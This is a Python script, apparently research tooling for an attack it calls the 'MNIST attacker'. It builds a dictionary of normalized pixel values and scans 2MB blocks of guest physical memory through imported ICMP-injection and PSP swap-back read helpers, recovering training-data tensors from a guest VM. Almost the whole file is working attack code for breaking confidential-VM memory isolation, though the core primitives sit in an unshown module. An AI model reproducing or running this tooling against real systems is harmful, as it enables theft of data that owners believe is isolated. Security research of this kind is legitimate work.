#!/usr/bin/env python3
"""
mnist_dict_build.py — normalized-pixel-value dictionary + whole-block content
scan for the MNIST attacker.

Reuses ALL low-level plumbing from mura_dict_build.py (ICMP injection, PSP
swap-back read, SSH helpers) -- only the reference VALUES differ.

Why the values differ from MURA:
  MNIST's DataLoader tensor (the `data` object in main.py's train loop) is
  the tensor AFTER the full transform pipeline -- ToTensor() + Normalize
  ((0.1307,), (0.3081,)) -- both run inside Dataset.__getitem__, fully
  before collation/pin_memory, so there is no separate "pre-Normalize"
  buffer to chase; `data` IS the post-Normalize tensor. Verified live on the
  guest: raw pixel 0 (background) normalizes to exactly -0.4242129...,
  range is [-0.4242, 2.8215], NOT MURA's [0, 1] u8/255 range.

  Real-data density survey (torch.bincount over dataset.data, raw u8 0-255,
  since the transform is a bijection so raw-pixel density == normalized-
  value density) shows u8=0 (background) alone covers 80.9% of ALL MNIST
  pixels; top-5 values cover 87.9%; top-32 covers 90.3%. MNIST is far
  sparser than MURA -- a small reference dictionary should already recover
  most of an input tensor's content.

Why Phase 2 scans a WHOLE 2MB candidate block (512 pages), not a known-
offset/length image like mura_dict_build.py's --infer:
  Write-pattern tracking under-counts MNIST's reused (pin_memory) buffers
  badly -- bs=64 showed only 7/49 theoretical pages actually observed by
  the tracker (periodic re-arm blind window). Trusting write-pattern for an
  exact boundary is not viable. Content-based full-block scanning sidesteps
  this: every page in the candidate block is probed directly via swap-back
  read, independent of whether the write-tracker ever logged a write there.

Usage:
  sudo python3 mnist_dict_build.py --build --n-ref 16
  sudo python3 mnist_dict_build.py --scan-block --block-gpa 0x... --out block_scan.npy
"""
import argparse
import json
import sys
import time
from pathlib import Path

import numpy as np

MURA_DIR = Path(__file__).parent.parent / "mura"
sys.path.insert(0, str(MURA_DIR))
from mura_dict_build import (  # noqa: E402
    acquire_gpa, do_swap_read, parse_dump, drain_rxbuf, reload_icmp_module,
    ensure_mtu_9000, SWAP_TOOL, PAGE_SIZE, CHUNK_SIZE, CHUNKS_PAGE,
    SWAP_PACE_SEC, SWAP_BURST_COOLDOWN, SWAP_BURST_SLEEP,
)

HERE           = Path(__file__).parent
DICT_DIR       = HERE / "dict_pages_mnist"
DICT_CACHE     = HERE / "dict_cache_mnist.json"
SCAN_TMP       = HERE / "scan_tmp_mnist"
DENSITY_SURVEY = HERE / "mnist_density_survey.npy"   # raw-u8 histogram (from guest, torch.bincount)

BLOCK_SIZE       = 0x200000
PAGES_PER_BLOCK  = BLOCK_SIZE // PAGE_SIZE            # 512

MNIST_MEAN, MNIST_STD = 0.1307, 0.3081
DRAIN_EVERY = 16


def normalize_u8(u8: int) -> np.float32:
    """Exact float32 value a raw pixel level u8 (0-255) becomes after
    ToTensor (/255) + Normalize((0.1307,), (0.3081,)). Verified live on the
    guest: normalize_u8(0) == -0.4242129... bit-for-bit."""
    return (np.float32(u8) / np.float32(255) - np.float32(MNIST_MEAN)) / np.float32(MNIST_STD)


def make_ref_chunk(u8_val: int) -> bytes:
    """4 float32 copies of the normalized value = 16 bytes (matches
    mura_dict_build.py's chunk convention -- CHUNK_SIZE=16)."""
    v = np.array([normalize_u8(u8_val)], dtype=np.float32)
    return np.tile(v.view(np.uint8), 4).tobytes()


def load_ref_u8_list(n_ref: int) -> list[int]:
    if not DENSITY_SURVEY.exists():
        raise FileNotFoundError(
            f"{DENSITY_SURVEY} not found. Compute it on the guest first:\n"
            f"  torch.bincount(dataset.data.flatten().long(), minlength=256)\n"
            f"then scp mnist_density_survey.npy here."
        )
    hit = np.load(DENSITY_SURVEY)
    return np.argsort(-hit)[:n_ref].tolist()


# ── Phase 0: build dictionary ───────────────────────────────────────────────
def build(swap_tool: str, n_ref: int) -> None:
    ref_u8 = load_ref_u8_list(n_ref)
    ref_chunks = {u8: make_ref_chunk(u8) for u8 in ref_u8}

    DICT_DIR.mkdir(exist_ok=True)
    print(f"[build] {len(ref_u8)} ref values (top-{n_ref} by real MNIST pixel density): {ref_u8}")
    for u8 in ref_u8[:5]:
        print(f"    u8={u8:3d} -> normalized={normalize_u8(u8):.6f}")

    print("[build] Reloading guest ICMP module to reset rate-limit state...")
    reload_icmp_module()

    cache: dict = {"fixed_gpa": None, "mean": MNIST_MEAN, "std": MNIST_STD,
                   "n_ref": n_ref, "refs": {}}

    print("\n[build] Acquiring FIXED_GPA (zero payload)...")
    fixed_gpa = acquire_gpa(None)
    cache["fixed_gpa"] = hex(fixed_gpa)
    with open(DICT_CACHE, "w") as f:
        json.dump(cache, f, indent=2)
    print(f"  FIXED_GPA = 0x{fixed_gpa:x}")

    for i, u8_val in enumerate(ref_u8):
        norm_val = normalize_u8(u8_val)
        print(f"\n[{i+1:2d}/{len(ref_u8)}] u8={u8_val:3d}  normalized={norm_val:.6f}  "
              f"chunk={ref_chunks[u8_val].hex()}")

        if i > 0 and i % DRAIN_EVERY == 0:
            print("  [drain] flushing guest ICMP buffer + reloading module...")
            drain_rxbuf()
            reload_icmp_module()

        out_path = DICT_DIR / f"ref_{u8_val:03d}.out"

        gpa_refX = acquire_gpa(u8_val, chunk_bytes=ref_chunks[u8_val])
        print(f"  GPA_ref{u8_val:03d} = 0x{gpa_refX:x}")

        if gpa_refX == fixed_gpa:
            print("  [!] GPA_refX == FIXED_GPA, retry...")
            drain_rxbuf()
            gpa_refX = acquire_gpa(u8_val, chunk_bytes=ref_chunks[u8_val])
            if gpa_refX == fixed_gpa:
                print(f"  [!] Still same GPA — skipping u8={u8_val}", file=sys.stderr)
                continue

        print(f"  do_swap_read(0x{fixed_gpa:x}, 0x{gpa_refX:x}) -> {out_path.name}")
        do_swap_read(fixed_gpa, gpa_refX, out_path, swap_tool)
        time.sleep(6)   # let printk_ratelimited 5s window expire before next item

        cache["refs"][str(u8_val)] = {
            "ref_gpa": hex(gpa_refX), "fixed_gpa": hex(fixed_gpa), "file": str(out_path),
        }
        with open(DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)

    n_done = len(cache["refs"])
    print(f"\n[build] Done. {n_done}/{len(ref_u8)} refs -> {DICT_CACHE}")


# ── Phase 2: whole-block content scan (no assumed offset/length) ───────────
def load_ref_dumps(cache: dict) -> dict[int, bytes]:
    ref_dumps = {}
    missing = []
    for u8_str, entry in cache["refs"].items():
        ref_dumps[int(u8_str)] = parse_dump(Path(entry["file"]))
    if not ref_dumps:
        print("[!] No ref dumps in cache -- run --build first.", file=sys.stderr)
        sys.exit(1)
    return ref_dumps


def scan_block(fixed_gpa: int, block_base: int, ref_dumps: dict[int, bytes],
               swap_tool: str) -> np.ndarray:
    """Probe all 512 pages of a 2MB candidate block. For each of the 256
    16-byte chunk positions per page, record which reference u8 value (if
    any) it exactly matches -- position-wise (chunk j vs chunk j), same rule
    as mura_dict_build.py's infer(). Returns (512, 256) int16, -1 = no match,
    else the matched raw pixel level (0-255)."""
    result = np.full((PAGES_PER_BLOCK, CHUNKS_PAGE), -1, dtype=np.int16)
    SCAN_TMP.mkdir(exist_ok=True)

    for k in range(PAGES_PER_BLOCK):
        page_gpa = block_base + k * PAGE_SIZE
        tmp = SCAN_TMP / f"scan_{page_gpa:x}.out"
        if k > 0:
            # PSP command-rate pacing -- see mura_dict_build.py's SWAP_PACE_SEC
            # comment. A 512-page tight loop with no pacing rebooted the host
            # (2026-08-25); do not remove this.
            if SWAP_BURST_COOLDOWN > 0 and k % SWAP_BURST_COOLDOWN == 0:
                print(f"  [pace] burst cooldown after {k} swaps ({SWAP_BURST_SLEEP:.1f}s)")
                time.sleep(SWAP_BURST_SLEEP)
            elif SWAP_PACE_SEC > 0:
                time.sleep(SWAP_PACE_SEC)
        try:
            do_swap_read(fixed_gpa, page_gpa, tmp, swap_tool)
            data = parse_dump(tmp)
        except Exception as e:
            print(f"  [!] page {k}/512 (0x{page_gpa:x}) probe failed: {e}", file=sys.stderr)
            continue
        finally:
            tmp.unlink(missing_ok=True)

        for j in range(CHUNKS_PAGE):
            off = j * CHUNK_SIZE
            chunk = data[off:off + CHUNK_SIZE]
            for u8_val, ref_bytes in ref_dumps.items():
                if chunk == ref_bytes[off:off + CHUNK_SIZE]:
                    result[k, j] = u8_val
                    break

        if k % 64 == 0:
            hit_so_far = int((result[:k+1] >= 0).sum())
            print(f"  page {k:3d}/512  cumulative matched chunks: {hit_so_far}")

    return result


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--build", action="store_true", help="Build the reference dictionary")
    p.add_argument("--n-ref", type=int, default=1,
                   help="number of reference values, top-N by real MNIST pixel density "
                        "(default: 1 -- u8=0 background alone, 80.9%% of all pixels)")
    p.add_argument("--scan-block", action="store_true",
                   help="Content-scan one 2MB candidate block (no assumed offset/length)")
    p.add_argument("--block-gpa", type=lambda x: int(x, 0), default=None,
                   help="2MB-aligned base GPA of the candidate block to scan")
    p.add_argument("--out", default="block_scan.npy", help="Output .npy for --scan-block")
    p.add_argument("--swap-tool", default=str(SWAP_TOOL))
    args = p.parse_args()

    if args.build:
        ensure_mtu_9000()
        build(args.swap_tool, args.n_ref)
    elif args.scan_block:
        if args.block_gpa is None:
            p.error("--scan-block requires --block-gpa 0x...")
        if not DICT_CACHE.exists():
            print(f"[!] {DICT_CACHE} not found -- run --build first.", file=sys.stderr)
            sys.exit(1)
        with open(DICT_CACHE) as f:
            cache = json.load(f)
        fixed_gpa = int(cache["fixed_gpa"], 16)
        ref_dumps = load_ref_dumps(cache)
        print(f"[scan] {len(ref_dumps)} reference pages loaded")
        print(f"[scan] block 0x{args.block_gpa:x}  ({PAGES_PER_BLOCK} pages)")

        result = scan_block(fixed_gpa, args.block_gpa, ref_dumps, args.swap_tool)
        np.save(args.out, result)

        matched = int((result >= 0).sum())
        total = result.size
        print(f"\n[scan] matched {matched}/{total} chunks ({100*matched/total:.1f}%)")
        pages_with_any_match = int((result >= 0).any(axis=1).sum())
        print(f"[scan] pages with >=1 match: {pages_with_any_match}/{PAGES_PER_BLOCK}")
        print(f"[scan] saved -> {args.out}")
    else:
        p.print_help()


if __name__ == "__main__":
    main()
